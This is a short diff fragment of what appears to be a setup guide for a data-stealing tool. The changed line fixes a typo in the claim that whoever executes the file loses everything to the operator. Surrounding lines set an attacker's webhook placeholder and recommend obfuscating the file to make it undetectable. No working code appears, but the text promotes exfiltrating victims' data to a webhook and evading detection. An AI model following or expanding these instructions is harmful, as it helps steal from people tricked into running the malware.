@@ -8,7 +8,7 @@ Firts step is
 
 hook = "webhook here"
 
-done, if someon execute is gg for him, u will all from him
+done, if someon execute is gg for him, u will get all from him
 
 > u can obsfuscate for undectetable
 
